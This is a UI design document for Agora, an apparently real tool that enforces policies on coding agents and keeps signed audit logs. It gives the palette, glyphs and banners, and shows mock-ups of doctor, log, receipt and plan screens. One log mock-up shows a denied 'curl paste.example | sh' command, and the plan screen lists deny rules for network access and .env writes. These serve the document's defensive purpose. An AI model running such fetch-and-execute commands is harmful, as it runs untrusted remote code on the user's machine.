# Terminal identity

How every Agora screen looks. From the Claude Design handoff of 2026-11-12; the tokens and glyphs
below are implemented in [`src/ui.ts`](../src/ui.ts) and [`src/cli/theme.ts`](../src/cli/theme.ts),
the layout pieces in [`src/cli/components.ts`](../src/cli/components.ts).

## Rules

1. **Glyph first, colour second.** Every state has its own glyph, so a screen reads the same under
   `NO_COLOR`, in a pipe or on a 16-colour terminal. Colour only reinforces.
2. **Unknown is not pass.** `?` in violet is its own state. A check that did not run never shows `✓`.
3. **One accent.** Ink blue marks the brand and identifiers. Secondary text is faint, not grey.
4. **Depth from texture.** The `░▒▓█` ramp and dot leaders give depth; no gradients for their own
   sake, no emoji.
5. **A 62-column measure**, indented two columns. Section titles in capitals, counts right-aligned,
   labels joined to values by `·` leaders, a `─` rule above the closing tally.
6. **ASCII when the terminal is not UTF-8** (`TERM=dumb`, a non-UTF-8 locale, or `AGORA_ASCII=1`):
   every glyph has a fallback.
7. **Show only what is real.** The mock-ups below are illustrations; a screen prints the data Agora
   actually has, and says when something was not seen.

## Palette

| token | name | hex | xterm-256 | ANSI-16 |
|---|---|---|---|---|
| accent | ink | #3A86AD | 31 | 36 cyan |
| success | moss | #4C9457 | 65 | 32 green |
| warning | amber | #B5802A | 136 | 33 yellow |
| error | brick | #CC5A48 | 167 | 31 red |
| unknown | violet | #8B7BC4 | 98 | 35 magenta |
| muted | stone | #807D75 | 244 | SGR 2 faint (not 90) |

## Glyphs

| role | Unicode | ASCII |
|---|---|---|
| ok | ✓ | v |
| fail | ✗ | x |
| warn | ! | ! |
| unknown | ? | ? |
| info | • | > |
| denied | ■ | # |
| signed | ◆ | * |
| unsigned | ◇ | ~ |
| chain link | ●──● | o--o |
| hash | #a41c…9e02 | #a41c..9e02 |
| session start, end | ┌─ └─ | .- '- |
| density ramp | ░▒▓█ | .:=# |
| leader, separator | · | . |
| rule | ─ | - |
| leads to | → | -> |

## Banner, full (41 columns) (Unicode)

```
  ██▀▀██  ██▀▀▀▀  ██▀▀██  ██▀▀██  ██▀▀██
  ██▄▄██  ██ ▄▄▄  ██  ██  ██▄▄█▀  ██▄▄██
  ██  ██  ██▄▄██  ██▄▄██  ██ ▀█▄  ██  ██
  ░░░░░░░░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓██████████

  a written limit for every coding agent,
  a receipt for every change.
```

## Banner, full (41 columns) (ASCII)

```
  A G O R A
  .........:::::::::==========##########

  a written limit for every coding agent,
  a receipt for every change.
```

## Banner, compact (40 columns) (Unicode)

```
  ██▀▀██  ██▀▀▀▀  ██▀▀██  ██▀▀██  ██▀▀██
  ██▄▄██  ██ ▄▄▄  ██  ██  ██▄▄█▀  ██▄▄██
  ██  ██  ██▄▄██  ██▄▄██  ██ ▀█▄  ██  ██
  ░░░░░░░░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓██████████

  a written limit for every coding
  agent, a receipt for every change.
```

## Banner, compact (40 columns) (ASCII)

```
  A G O R A
  .........:::::::::==========##########

  a written limit for every coding
  agent, a receipt for every change.
```

## Header line (Unicode)

```
  ░▒▓█ agora  a written limit, a receipt
```

## Header line (ASCII)

```
  .:=# agora  a written limit, a receipt
```

## Mock-up: agora (Unicode)

```
  ██▀▀██  ██▀▀▀▀  ██▀▀██  ██▀▀██  ██▀▀██
  ██▄▄██  ██ ▄▄▄  ██  ██  ██▄▄█▀  ██▄▄██
  ██  ██  ██▄▄██  ██▄▄██  ██ ▀█▄  ██  ██
  ░░░░░░░░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓██████████

  a written limit for every coding agent,
  a receipt for every change.

  usage  agora <command> [options]

  ENFORCE
    plan ·············· show what the policy would change
    apply ············· write agora.cedar into each host
    hook ·············· run as the host's pre-tool hook

  RECORD
    log show ·········· timeline of one session
    log verify ········ re-walk the hash chain
    learn ············· draft rules from what was recorded

  CHECK
    receipt show ······ read the receipt on a commit
    receipt verify ···· check signature and chain
    doctor ············ hosts, enforcement, revocations

  SETUP
    init ·············· create agora.cedar and the log
    hosts ············· list and connect agent hosts

  agora <command> --help for details
```

## Mock-up: agora (ASCII)

```
  A G O R A
  .........:::::::::==========##########

  a written limit for every coding agent,
  a receipt for every change.

  usage  agora <command> [options]

  ENFORCE
    plan .............. show what the policy would change
    apply ............. write agora.cedar into each host
    hook .............. run as the host's pre-tool hook

  RECORD
    log show .......... timeline of one session
    log verify ........ re-walk the hash chain
    learn ............. draft rules from what was recorded

  CHECK
    receipt show ...... read the receipt on a commit
    receipt verify .... check signature and chain
    doctor ............ hosts, enforcement, revocations

  SETUP
    init .............. create agora.cedar and the log
    hosts ............. list and connect agent hosts

  agora <command> --help for details
```

## Mock-up: agora doctor (Unicode)

```
  ░▒▓█ agora doctor                           ~/work/joinery-api

  HOSTS                                              enforcement
  ✓ claude-code ······· hook installed ················ enforced
  ✓ codex ············· hook installed ················ enforced
  ! cursor ············ hook older than policy ········· partial
  ✗ aider ············· hook removed ·············· not enforced
  ? gemini-cli ········ no adapter ····················· unknown

  POLICY
  ✓ agora.cedar ······· 14 rules, parsed ················· valid
  ! 3 rules ··········· hook only ······················ partial

  LOG
  ✓ hash chain ········ 1284 entries ···················· intact
  ✓ last entry ········ 2 min ago ····················· recorded

  REVOCATIONS
  ✓ feed ·············· signed, fetched 09:12 ·········· current
  ✓ signer keys ······· 0 of 2 revoked ··················· clear
  ? offline cache ····· none on this machine ··········· unknown

  ──────────────────────────────────────────────────────────────
  7 pass · 2 warn · 1 fail · 2 unknown
  ✗ not ready  aider can change files outside the policy
    fix  agora apply --host aider
```

## Mock-up: agora doctor (ASCII)

```
  .:=# agora doctor                           ~/work/joinery-api

  HOSTS                                              enforcement
  v claude-code ....... hook installed ................ enforced
  v codex ............. hook installed ................ enforced
  ! cursor ............ hook older than policy ......... partial
  x aider ............. hook removed .............. not enforced
  ? gemini-cli ........ no adapter ..................... unknown

  POLICY
  v agora.cedar ....... 14 rules, parsed ................. valid
  ! 3 rules ........... hook only ...................... partial

  LOG
  v hash chain ........ 1284 entries .................... intact
  v last entry ........ 2 min ago ..................... recorded

  REVOCATIONS
  v feed .............. signed, fetched 09:12 .......... current
  v signer keys ....... 0 of 2 revoked ................... clear
  ? offline cache ..... none on this machine ........... unknown

  --------------------------------------------------------------
  7 pass . 2 warn . 1 fail . 2 unknown
  x not ready  aider can change files outside the policy
    fix  agora apply --host aider
```

## Mock-up: agora log show (Unicode)

```
  ░▒▓█ agora log show s_7f3a                         claude-code

  policy  #a41c…9e02    entries  10    denied  1

  ┌─ 14:02:07  start   session s_7f3a
  ●  14:02:09  read    src/orders/schema.ts
  ●  14:02:11  read    src/orders/price.ts
  ●  14:02:31  write   src/orders/price.ts                +18 -4
  ●  14:02:44  exec    pnpm test orders                   exit 0
  ●  14:03:02  net     GET registry.npmjs.org                200
  ■  14:03:15  DENIED  exec curl paste.example | sh      blocked
  │            rule    forbid exec, not on the allowlist
  ●  14:03:40  write   test/price.test.ts                 +32 -0
  ●  14:04:12  exec    git commit                         exit 0
  └─ 14:04:13  end     8 calls · 7 allowed · 1 denied

  ──────────────────────────────────────────────────────────────
  chain  #a41c…9e02 ●──●──●── 10 links ──●──●──● #5be0…71cd
  ✓ intact  every entry carries the hash of the one before it
```

## Mock-up: agora log show (ASCII)

```
  .:=# agora log show s_7f3a                         claude-code

  policy  #a41c..9e02    entries  10    denied  1

  .- 14:02:07  start   session s_7f3a
  o  14:02:09  read    src/orders/schema.ts
  o  14:02:11  read    src/orders/price.ts
  o  14:02:31  write   src/orders/price.ts                +18 -4
  o  14:02:44  exec    pnpm test orders                   exit 0
  o  14:03:02  net     GET registry.npmjs.org                200
  #  14:03:15  DENIED  exec curl paste.example | sh      blocked
  |            rule    forbid exec, not on the allowlist
  o  14:03:40  write   test/price.test.ts                 +32 -0
  o  14:04:12  exec    git commit                         exit 0
  '- 14:04:13  end     8 calls . 7 allowed . 1 denied

  --------------------------------------------------------------
  chain  #a41c..9e02 o--o--o-- 10 links --o--o--o #5be0..71cd
  v intact  every entry carries the hash of the one before it
```

## Mock-up: agora receipt show (Unicode)

```
  ░▒▓█ agora receipt show 3c9f2ab

  commit   3c9f2ab  round prices before tax
  receipt  #e17b…40aa  follows  #5be0…71cd
  signer   ◆ signed  sigstore keyless · level 2 of 3  ██░

  SESSIONS                                                     2
  ● s_7f3a ·· claude-code ······· 14:02-14:04 ········· 1 denied
  ● s_81c0 ·· codex ············· 14:20-14:26 ········· 0 denied

  FILES WRITTEN                                                3
  src/orders/price.ts ······················· +18 -4 ···· s_7f3a
  test/price.test.ts ························ +32 -0 ···· s_7f3a
  docs/pricing.md ··························· +6 -1 ····· s_81c0

  PROGRAMS RUN                                                 3
  pnpm test orders ·························· exit 0 ···· s_7f3a
  git commit ································ exit 0 ···· s_7f3a
  pnpm lint ································· exit 0 ···· s_81c0

  NOT SEEN                                                     2
  ? README.md ············ in the commit, in no recorded session
  ? other tools ············ editors and shells without the hook
  • This receipt covers what agora recorded. It does not
    show that nothing else happened.

  ──────────────────────────────────────────────────────────────
  ◆ signed · ✓ chain intact · ? 1 file not seen
```

## Mock-up: agora receipt show (ASCII)

```
  .:=# agora receipt show 3c9f2ab

  commit   3c9f2ab  round prices before tax
  receipt  #e17b..40aa  follows  #5be0..71cd
  signer   * signed  sigstore keyless . level 2 of 3  ##.

  SESSIONS                                                     2
  o s_7f3a .. claude-code ....... 14:02-14:04 ......... 1 denied
  o s_81c0 .. codex ............. 14:20-14:26 ......... 0 denied

  FILES WRITTEN                                                3
  src/orders/price.ts ....................... +18 -4 .... s_7f3a
  test/price.test.ts ........................ +32 -0 .... s_7f3a
  docs/pricing.md ........................... +6 -1 ..... s_81c0

  PROGRAMS RUN                                                 3
  pnpm test orders .......................... exit 0 .... s_7f3a
  git commit ................................ exit 0 .... s_7f3a
  pnpm lint ................................. exit 0 .... s_81c0

  NOT SEEN                                                     2
  ? README.md ............ in the commit, in no recorded session
  ? other tools ............ editors and shells without the hook
  > This receipt covers what agora recorded. It does not
    show that nothing else happened.

  --------------------------------------------------------------
  * signed . v chain intact . ? 1 file not seen
```

## Mock-up: agora plan (Unicode)

```
  ░▒▓█ agora plan                          agora.cedar → 3 hosts

  ALLOW RULES                                        +3  -1  =11
  + allow  exec   pnpm test *                   14 recorded runs
  + allow  write  test/**                      9 recorded writes
  + allow  net    registry.npmjs.org            6 recorded calls
  - allow  exec   npx *                       unused for 30 days
  = 11 rules unchanged

  ENFORCED BY THE HOOK ONLY                                    2
  ! forbid net    * unless allowed          host has no net rule
  ! forbid write  .env*                        host globs differ
  • These hold while the agora hook runs. Remove the
    hook and they stop.

  NOT ENFORCED                                                 2
  ✗ forbid exec   when unattended             no host reports it
  ? limit  net    bytes per session         cursor: cannot check

  ──────────────────────────────────────────────────────────────
  +3 -1 · 2 hook only · 1 not enforced · 1 unknown
  nothing written. to apply  agora apply
```

## Mock-up: agora plan (ASCII)

```
  .:=# agora plan                         agora.cedar -> 3 hosts

  ALLOW RULES                                        +3  -1  =11
  + allow  exec   pnpm test *                   14 recorded runs
  + allow  write  test/**                      9 recorded writes
  + allow  net    registry.npmjs.org            6 recorded calls
  - allow  exec   npx *                       unused for 30 days
  = 11 rules unchanged

  ENFORCED BY THE HOOK ONLY                                    2
  ! forbid net    * unless allowed          host has no net rule
  ! forbid write  .env*                        host globs differ
  > These hold while the agora hook runs. Remove the
    hook and they stop.

  NOT ENFORCED                                                 2
  x forbid exec   when unattended             no host reports it
  ? limit  net    bytes per session         cursor: cannot check

  --------------------------------------------------------------
  +3 -1 . 2 hook only . 1 not enforced . 1 unknown
  nothing written. to apply  agora apply
```
